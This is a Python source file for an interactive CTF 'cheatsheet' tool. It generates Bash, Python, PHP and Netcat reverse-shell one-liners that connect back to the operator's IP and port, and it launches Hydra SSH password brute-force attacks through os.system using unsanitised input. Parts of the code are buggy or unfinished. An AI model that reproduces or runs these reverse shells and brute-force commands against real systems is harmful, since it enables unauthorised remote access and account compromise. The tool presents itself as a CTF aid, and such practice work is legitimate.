#!/usr/bin/python3
# -*- coding: utf-8 -*-

from ast import For
from re import M
import sys
import os
from tkinter import W
from traceback import print_tb
import pyperclip
from time import sleep
from colorama import Fore
from colorama import Style
from netifaces import interfaces, ifaddresses, AF_INET

# Global variables for reverse shell
ipadd = "0.0.0.0"  # Global variable for IP address
port = "0000"  # Global variable for port
interf = "N/A"  # Global variable for interface

# Global variable for Hydra
wordlist = ""  # Global variable for wordlist
uname = ""  # Global variable for wordlist
uname_Wordlist = "" # Global variable for wordlist
passwd = ""  # Global variable for password
passwd_Wordlist = "" # Global variable for password


# Main function


def main():
    banner = f"""{Style.BRIGHT}{Fore.MAGENTA}   ________               __  _____ __              __     __________________
  / ____/ /_  ___  ____ _/ /_/ ___// /_  ___  ___  / /_   / ____/_  __/ ____/
 / /   / __ \/ _ \/ __ `/ __/\__ \/ __ \/ _ \/ _ \/ __/  / /     / / / /_    
{Fore.CYAN}/ /___/ / / /  __/ /_/ / /_ ___/ / / / /  __/  __/ /_   / /___  / / / __/    
\____/_/ /_/\___/\__,_/\__//____/_/ /_/\___/\___/\__/   \____/ /_/ /_/      {Fore.RESET}{Style.RESET_ALL}
                                                                             """
    print(banner)
    print('<------------------------------------------------------->')
    print(f'{Fore.YELLOW}[*]{Fore.RESET} Welcome to the Cheatsheet')
    print(f'{Fore.YELLOW}[*]{Fore.RESET} This tool is made to help you through the process of CTFs')
    print(f'{Fore.YELLOW}[*]{Fore.RESET} You can use this tool : to create a reverse shell, bruteforce a password, and a lot more')
    print(f'{Fore.YELLOW}[*]{Fore.RESET} Made by : {Style.BRIGHT}{Fore.LIGHTCYAN_EX}https://github.com/Oxooi{Fore.RESET}{Style.RESET_ALL}')
    print("")
    print("+-------------------------------------+")
    print(f"|{Fore.YELLOW}[0] {Fore.LIGHTYELLOW_EX}Set Interface IP{Fore.RESET} ({Fore.LIGHTRED_EX}IMPORTANT{Fore.RESET})     |")
    print(f"|{Fore.YELLOW}[1] {Fore.LIGHTYELLOW_EX}Create Reverse Shells{Fore.RESET}            |")
    print(f"|{Fore.YELLOW}[2] {Fore.LIGHTYELLOW_EX}Netcat Connection{Fore.RESET}                |")
    print(f"|{Fore.YELLOW}[3] {Fore.LIGHTYELLOW_EX}Hydra Brute Force{Fore.RESET}                |")
    print("+-------------------------------------+")
    print("")
    print(f"{Fore.GREEN}[+] {Style.BRIGHT}{Fore.LIGHTBLUE_EX}Local IP {Fore.RESET}: " + ipadd + f"{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] {Style.BRIGHT}{Fore.LIGHTBLUE_EX}Interface {Fore.RESET}: " + interf + f"{Style.RESET_ALL}")
    print("\n\n-------------")
    choice = input('\nEnter your choice : ')
    match choice:  # Match choice
        case '0':   # Set interface IP
            setIp()
            backtomain()
        case '1':  # Create reverse shell
            revershell()
        case '2':  # Netcat connection
            netcat()
        case '3':  
            hydra()

# Banner function


def banner():
    banner = f"""{Style.BRIGHT}{Fore.LIGHTYELLOW_EX}______                             _____ _          _ _
| ___ \                           /  ___| |        | | |
| |_/ /_____   _____ _ __ ___  ___\ `--.| |__   ___| | |
|    // _ \ \ / / _ \ '__/ __|/ _ \`--. \ '_ \ / _ \ | |
{Fore.LIGHTRED_EX}| |\ \  __/\ V /  __/ |  \__ \  __/\__/ / | | |  __/ | |
\_| \_\___| \_/ \___|_|  |___/\___\____/|_| |_|\___|_|_|{Fore.RESET}{Style.RESET_ALL}
<------------------------------------------------------->
"""
    print(banner)


# Get IP of interface function
def getIp(interface):
    ipInt = ifaddresses(interface)[AF_INET][0]['addr']
    return ipInt


def getInterfaces():  # Get interfaces function
    # Loop through interfaces to get names and IPs
    x = 0
    for i in interfaces():
        x += 1
        print(Fore.GREEN + "\n[+] " + Style.BRIGHT +
              Fore.LIGHTBLUE_EX + i + Style.RESET_ALL + Fore.RESET)
        addresses = [i['addr'] for i in ifaddresses(
            i).setdefault(AF_INET, [{'addr': 'No IP addr'}])]
        print(' ' + Fore.GREEN + '└─> ' + Style.RESET_ALL +
              '(' + Style.BRIGHT + '\t'.join(addresses) + Style.RESET_ALL + ')')


# Set IP to global variable 'ipadd'
def setIp():
    getInterfaces()
    interface = input(f'\n{Fore.YELLOW}[*]{Fore.RESET}{Style.BRIGHT} Enter the interface (lo,eth0,wlan0) :{Style.RESET_ALL} ')
    getIp(interface)
    globals()['ipadd'] = getIp(interface)
    globals()['interf'] = interface


def choice(shell, extention):  # Choice for reverse shell
    choice = input(
        f'\n{Fore.YELLOW}[*]{Fore.RESET} Do you want to {Fore.YELLOW}Copy{Fore.RESET} your shell to clipboard or export as {Fore.RED}File{Fore.RESET} ? ({Fore.YELLOW}c{Fore.RESET}/{Fore.RED}f{Fore.RESET}) : ')
    match choice:  # Match choice
        case 'c':  # Case C for copy to clipboard
            pyperclip.copy(shell)  # Copy reverse shell command to clipboard
            print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Your shell is copied to Clipboard")
            sleep(1)
            backtomain()  # Go back to main menu
        case 'f':  # Case F for export as file
            file = "shell." + extention  # Create file name
            with open(file, "w") as f:  # Open file and write reverse shell command
                f.write(shell)  # Write reverse shell command to file
            print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Your shell is exported as " + file)
            sleep(1)
            backtomain()
    return shell, extention

# Go back to main menu function
def backtomain():
    print(f'\n{Fore.YELLOW}[*]{Fore.RESET} Go back to main')
    sleep(1)
    os.system('clear')
    main()

def jtr_banner():
    banner = f"""{Style.BRIGHT}{Fore.LIGHTRED_EX}     ██╗ ██████╗ ██╗  ██╗███╗   ██╗██████╗ ██████╗ ██╗██████╗ ██████╗ ███████╗██████╗ 
     ██║██╔═══██╗██║  ██║████╗  ██║╚════██╗██╔══██╗██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
     ██║██║   ██║███████║██╔██╗ ██║ █████╔╝██████╔╝██║██████╔╝██████╔╝█████╗  ██████╔╝
██   ██║██║   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██╗██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
╚█████╔╝╚██████╔╝██║  ██║██║ ╚████║███████╗██║  ██║██║██║     ██║     ███████╗██║  ██║
 ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝{Style.RESET_ALL}{Fore.RESET}
 ------------------------------------------------------------------------------------->os.system(hydra)
                                                                                      """
    print(banner)

#John the Ripper
def jtr():
    jtr_banner()
    modules = f"""
    - [{Fore.LIGHTBLUE_EX}1{Fore.RESET}] {Fore.LIGHTCYAN_EX} ZIP Wordlist attack{Fore.RESET}
    - [{Fore.LIGHTBLUE_EX}2{Fore.RESET}] {Fore.LIGHTCYAN_EX} Hash Wordlist attack{Fore.RESET}
    - [{Fore.LIGHTBLUE_EX}3{Fore.RESET}] {Fore.LIGHTCYAN_EX} MD5{Fore.RESET}
    - [{Fore.LIGHTBLUE_EX}4{Fore.RESET}] {Fore.LIGHTCYAN_EX} Sha1{Fore.RESET}
    - [{Fore.LIGHTBLUE_EX}5{Fore.RESET}] {Fore.LIGHTCYAN_EX} Base64{Fore.RESET}
    - [{Fore.LIGHTBLUE_EX}99{Fore.RESET}] {Fore.LIGHTCYAN_EX}Back to main{Fore.RESET}
    """
    print(modules)
# The main function for reverse shells
def revershell():
    os.system('clear')
    banner()
    shells = f"""  
- [{Style.BRIGHT}1{Style.RESET_ALL}] {Style.BRIGHT}{Fore.LIGHTBLUE_EX}Bash {Fore.BLUE}reverse_shell {Fore.RESET}{Style.RESET_ALL}
- [{Style.BRIGHT}2{Style.RESET_ALL}] {Style.BRIGHT}{Fore.LIGHTCYAN_EX}Python {Fore.CYAN}reverse_shell {Fore.RESET}{Style.RESET_ALL}
- [{Style.BRIGHT}3{Style.RESET_ALL}] {Style.BRIGHT}{Fore.LIGHTGREEN_EX}PHP {Fore.GREEN}reverse_shell {Fore.RESET}{Style.RESET_ALL}
- [{Style.BRIGHT}4{Style.RESET_ALL}] {Style.BRIGHT}{Fore.LIGHTMAGENTA_EX}Netcat {Fore.MAGENTA}reverse_shell {Fore.RESET}{Style.RESET_ALL}
- [{Style.BRIGHT}99{Style.RESET_ALL}] {Style.BRIGHT}Back to main{Style.RESET_ALL}
"""
    print(shells)
    c_rs = input('\nEnter your choice : ')  # Choice for reverse shell
    match c_rs:  # Match choice
        case '1':  # Bash reverse shell
            bash()
        case '2':  # Python reverse shell
            python()
        case '3':  # PHP reverse shell
            php()
        case '4':  # Netcat reverse shell
            nc()
        case '99':  # Exit
            backtomain()

# Bash reverse shell function
def bash():
    os.system('clear')
    banner()
    port1 = "1234"  # Setup default port for reverse shell
    if ipadd == "0.0.0.0":  # Check if IP address and Interface  is set
        print(f"{Fore.RED}[!] {Fore.LIGHTRED_EX}You need to set your interface ip" + Fore.RESET)
        setIp()
        bash()  # Callback bash function
    else:  # If IP address and Interface is set
        port = input(f'{Fore.YELLOW}[*]{Fore.RESET} Enter your port (Default : 1234) : ')
        if port == '':
            port = port1  # If no port is entered, use default port
        else:
            # If port is entered, set it to global variable
            globals()['port'] = port
    print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Your shell is creating...")
    sleep(1)
    shell = 'bash -i >& /dev/tcp/' + ipadd + '/' + \
        port + ' 0>&1'  # Create reverse shell command
    print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Your shell is created")
    choice(shell, "sh")  # Call choice function for reverse shell


def python():  # Python reverse shell function
    os.system('clear')  # Its the same code as bash reverse shell function
    banner()
    port1 = "1234"
    if ipadd == "0.0.0.0":
        print(f"{Fore.RED}[!]{Fore.RESET} You need to set your interface ip")
        setIp()
        python()
    else:
        port = input(f'{Fore.YELLOW}[*]{Fore.RESET} Enter your port (Default : 1234) : ')
        if port == '':
            port = port1
        else:
            globals()['port'] = port
    print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Your shell is creating...")
    sleep(1)
    shell = 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' + ipadd + \
        '",' + port + \
            '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
    print(f"{Fore.YELLOW}[*]{Fore.RESET} Your shell is created")
    choice(shell, "py")

def php():                                                                         #PHP reverse shell function
    os.system('clear')                                                            #Its the same code as bash reverse shell function
    banner()
    port1 = "1234"
    if ipadd == "0.0.0.0":
        print(f"{Fore.RED}[!]{Fore.RESET} You need to set your interface ip")
        setIp()
        php()
    else:
        port = input(f'{Fore.YELLOW}[*]{Fore.RESET} Enter your port (Default : 1234) : ')
        if port == '':
            port = port1
        else:
            globals()['port'] = port
    print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Your shell is creating...")
    sleep(1)
    shell = "php -r '$sock=fsockopen(" + ipadd + \
        "," + port+");exec('/bin/sh -i <&3 >&3 2>&3');'"
    print(f"{Fore.YELLOW}[*]{Fore.RESET} Your shell is created")
    choice(shell, "php")


def nc():  # Netcat reverse shell function
    os.system('clear')  # Its the same code as bash reverse shell function
    banner()
    port1 = "1234"
    if ipadd == "0.0.0.0":
        print(f"{Fore.RED}[!]{Fore.RESET} You need to set your interface ip")
        setIp()
        nc()
    else:
        port = input(f'{Fore.YELLOW}[*]{Fore.RESET} Enter your port (Default : 1234) : ')
        if port == '':
            port = port1
        else:
            globals()['port'] = port
    print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Your shell is creating...")
    sleep(1)
    shell = "nc -e /bin/sh " + ipadd + " " + port
    print(f"{Fore.YELLOW}[*]{Fore.RESET} Your shell is created")
    choice(shell, "sh")


def netcat():
    os.system('clear')
    banner = """
███╗   ██╗███████╗████████╗ ██████╗ █████╗ ████████╗
████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗╚══██╔══╝
██╔██╗ ██║█████╗     ██║   ██║     ███████║   ██║   
██║╚██╗██║██╔══╝     ██║   ██║     ██╔══██║   ██║   
██║ ╚████║███████╗   ██║   ╚██████╗██║  ██║   ██║   
╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝╚═╝  ╚═╝   ╚═╝  
<------------------------------------------------------->"""
    print(banner)


def hydra_banner():
    os.system('clear')
    banner = f"""{Style.BRIGHT}{Fore.LIGHTCYAN_EX}
██╗  ██╗██╗   ██╗██████╗ ██████╗  █████╗ 
██║  ██║╚██╗ ██╔╝██╔══██╗██╔══██╗██╔══██╗
███████║ ╚████╔╝ ██║  ██║██████╔╝███████║
██╔══██║  ╚██╔╝  ██║  ██║██╔══██╗██╔══██║
██║  ██║   ██║   ██████╔╝██║  ██║██║  ██║
╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ {Fore.RESET}{Style.RESET_ALL}
<---------------------------------------->"""
    print(banner)


def hydra():
    hydra_banner()
    print(f'- [{Style.BRIGHT}1{Style.RESET_ALL}] {Style.BRIGHT}{Fore.MAGENTA}SSH{Fore.RESET}{Style.RESET_ALL}')
    print(f'- [{Style.BRIGHT}2{Style.RESET_ALL}] {Style.BRIGHT}{Fore.MAGENTA}FTP{Fore.RESET}{Style.RESET_ALL}')
    print(f'- [{Style.BRIGHT}3{Style.RESET_ALL}] {Style.BRIGHT}{Fore.MAGENTA}HTTP (POST-Form){Fore.RESET}{Style.RESET_ALL}')
    print(f'- [{Style.BRIGHT}4{Style.RESET_ALL}] {Style.BRIGHT}{Fore.MAGENTA}SQL{Fore.RESET}{Style.RESET_ALL}')
    print(f'- [{Style.BRIGHT}5{Style.RESET_ALL}] {Style.BRIGHT}{Fore.MAGENTA}SMTP (Enumerate Users){Fore.RESET}{Style.RESET_ALL}')
    print(f'- [{Style.BRIGHT}99{Style.RESET_ALL}] {Style.BRIGHT}{Fore.MAGENTA}Back to main{Fore.RESET}{Style.RESET_ALL}')

    choice = input('\nEnter your choice : ')
    if choice == '1':
        hydra_ssh()

def hydra_check_wordlist(wdlist):
    if os.path.exists(wdlist):
        if wdlist == "":
            wdlist = "/usr/share/wordlists/rockyou.txt"
            globals()['wordlist'] = wdlist
        else:
            globals()['wordlist'] = wdlist
    else:
        print(f"{Fore.RED}[!]{Fore.RESET} Wordlist not found")
        print(f"{Fore.RED}[!]{Fore.RESET} Come back to the menu and try again")
        sleep(1)
        input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
        hydra_ssh()
    return wdlist


def hydra_ssh():
    os.system('clear')
    hydra_banner()
    choice = input(f'\n{Fore.YELLOW}[*]{Fore.RESET} Do you know the {Fore.MAGENTA}username{Fore.RESET},{Fore.CYAN}password{Fore.RESET} or {Fore.RED}nothing{Fore.RESET} ? ({Fore.MAGENTA}u{Fore.RESET}/{Fore.CYAN}p{Fore.RESET}/{Fore.RED}n{Fore.RESET}): ')
    
    #If  the user knows the username
    if choice == 'u':

        #Input Section
        uname = input(f'\n{Fore.YELLOW}[*]{Fore.RESET} Enter the {Fore.MAGENTA}username{Fore.RESET} : ')
        wordlist = input(f'{Fore.YELLOW}[*]{Fore.RESET} Enter the path of your {Fore.CYAN}wordlist{Fore.RESET} (Default: /usr/share/wordlists/rockyou.txt) : ')
        ip = input(f'{Fore.YELLOW}[*]{Fore.RESET} Enter the {Fore.LIGHTGREEN_EX}ip{Fore.RESET} : ')
        
        #Checking Section
        #Username Check
        if uname == '':
            print(f"{Fore.RED}[!]{Fore.RESET} You didn't enter the {Fore.MAGENTA}username{Fore.RESET}")
            print(f"{Fore.RED}[!]{Fore.RESET} Come back to the menu and try again")
            sleep(1)
            input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
            hydra_ssh()

        #Wordlist Check
        if wordlist == '':
            wordlist = "/usr/share/wordlists/rockyou.txt"
            if os.path.exists(wordlist):
                globals()['wordlist'] = wordlist
            else:
                print(f"{Fore.RED}[!]{Fore.RESET} Wordlist not found")
                print(f"{Fore.RED}[!]{Fore.RESET} Come back to the menu and try again")
                sleep(1)
                input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
                hydra_ssh()
        else:
            if os.path.exists(wordlist):
                globals()['wordlist'] = wordlist
            else:
                print(f"{Fore.RED}[!]{Fore.RESET} Wordlist not found")
                print(f"{Fore.RED}[!]{Fore.RESET} Come back to the menu and try again")
                sleep(1)
                input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
                hydra_ssh()

        #IP Check
        if ip == '':
            print(f"{Fore.RED}[!]{Fore.RESET} You didn't enter the {Fore.LIGHTGREEN_EX}IP{Fore.RESET}")
            print(f"{Fore.RED}[!]{Fore.RESET} Come back to the menu and try again")
            sleep(1)
            input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
            hydra_ssh()
        else:
            globals()['ip'] = ip
        
        print(f"{Fore.GREEN}[+]{Fore.RESET} Hydra brute starting...")
        sleep(1)
        hydra_task = "hydra -l " + uname + " -P " + wordlist + " " + ip + " -s 22 -t 1 ssh"
        os.system(hydra_task)
        print(f"{Fore.GREEN}[+]{Fore.RESET} Hydra brute finished")
        sleep(1)
        input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
        hydra()

    #If the user know the password
    elif choice == 'p':
        
        #Input Section
        passwd = input(f'\n{Fore.YELLOW}[*]{Fore.RESET} Enter the {Fore.CYAN}password{Fore.RESET} : ')
        wordlist = input(f'{Fore.YELLOW}[*]{Fore.RESET} Enter the path of your {Fore.MAGENTA}wordlist{Fore.RESET} (Default: /usr/share/wordlists/rockyou.txt) : ')
        ip = input(f'{Fore.YELLOW}[*]{Fore.RESET} Enter the {Fore.LIGHTGREEN_EX}ip{Fore.RESET} : ')
        
        #Checking Section
        #Username Check
        if passwd == '':
            print(f"{Fore.RED}[!]{Fore.RESET} You didn't enter the {Fore.MAGENTA}password{Fore.RESET}")
            print(f"{Fore.RED}[!]{Fore.RESET} Come back to the menu and try again")
            sleep(1)
            input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
            hydra_ssh()

        #Wordlist Check
        if wordlist == '':
            wordlist = "/usr/share/wordlists/rockyou.txt"
            if os.path.exists(wordlist):
                globals()['wordlist'] = wordlist
            else:
                print(f"{Fore.RED}[!]{Fore.RESET} Wordlist not found")
                print(f"{Fore.RED}[!]{Fore.RESET} Come back to the menu and try again")
                sleep(1)
                input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
                hydra_ssh()
        else:
            if os.path.exists(wordlist):
                globals()['wordlist'] = wordlist
            else:
                print(f"{Fore.RED}[!]{Fore.RESET} Wordlist not found")
                print(f"{Fore.RED}[!]{Fore.RESET} Come back to the menu and try again")
                sleep(1)
                input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
                hydra_ssh()

        #IP Check
        if ip == '':
            print(f"{Fore.RED}[!]{Fore.RESET} You didn't enter the {Fore.LIGHTGREEN_EX}IP{Fore.RESET}")
            print(f"{Fore.RED}[!]{Fore.RESET} Come back to the menu and try again")
            sleep(1)
            input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
            hydra_ssh()
        else:
            globals()['ip'] = ip
        
        print(f"{Fore.GREEN}[+]{Fore.RESET} Hydra brute starting...")
        sleep(1)
        hydra_task = "hydra -p " + passwd + " -L " + wordlist + " " + ip + " -s 22 -t 1 ssh"
        os.system(hydra_task)
        print(f"{Fore.GREEN}[+]{Fore.RESET} Hydra brute finished")
        sleep(1)
        input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
        hydra()
    
    elif choice == 'n':

        #Input Section
        passwd_Wordlist = input(f'\n{Fore.YELLOW}[*]{Fore.RESET} Enter the {Fore.CYAN}password wordlist{Fore.RESET} : ')
        uname_Wordlist = input(f'{Fore.YELLOW}[*]{Fore.RESET} Enter the path of your {Fore.MAGENTA}username wordlist{Fore.RESET} : ')
        ip = input(f'{Fore.YELLOW}[*]{Fore.RESET} Enter the {Fore.LIGHTGREEN_EX}ip{Fore.RESET} : ')
        
        #Checking Section
        #Password Check
        if passwd_Wordlist == '':
            print(f"{Fore.RED}[!]{Fore.RESET} You didn't enter the {Fore.CYAN}password{Fore.RESET}")
            print(f"{Fore.RED}[!]{Fore.RESET} Come back to the menu and try again")
            sleep(1)
            input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
            hydra_ssh()

        #Username Check
        if uname_Wordlist == '':
            print(f"{Fore.RED}[!]{Fore.RESET} You didn't enter the {Fore.MAGENTA}username{Fore.RESET}")
            print(f"{Fore.RED}[!]{Fore.RESET} Come back to the menu and try again")
            sleep(1)
            input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
            hydra_ssh()

        #Wordlist Check
        if os.path.exists(passwd_Wordlist):
            globals()['passwd_Wordlist'] = passwd_Wordlist
        elif os.path.exists(uname_Wordlist):
            globals()['uname_Wordlist'] = uname_Wordlist
        else:
            print(f"{Fore.RED}[!]{Fore.RESET} Wordlist not found")
            print(f"{Fore.RED}[!]{Fore.RESET} Come back to the menu and try again")
            sleep(1)
            input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
            hydra_ssh()

        #IP Check
        if ip == '':
            print(f"{Fore.RED}[!]{Fore.RESET} You didn't enter the {Fore.LIGHTGREEN_EX}IP{Fore.RESET}")
            print(f"{Fore.RED}[!]{Fore.RESET} Come back to the menu and try again")
            sleep(1)
            input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
            hydra_ssh()
        else:
            globals()['ip'] = ip
        
        print(f"{Fore.GREEN}[+]{Fore.RESET} Hydra brute starting...")
        sleep(1)
        hydra_task = "hydra -P " + passwd_Wordlist + " -L " + uname_Wordlist + " " + ip + " -s 22 -t 1 ssh"
        os.system(hydra_task)
        print(f"{Fore.GREEN}[+]{Fore.RESET} Hydra brute finished")
        sleep(1)
        input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
        hydra()

# hydra()
jtr()

# if __name__ == "__main__":
#     main()                                                                       #Call main function to start the program
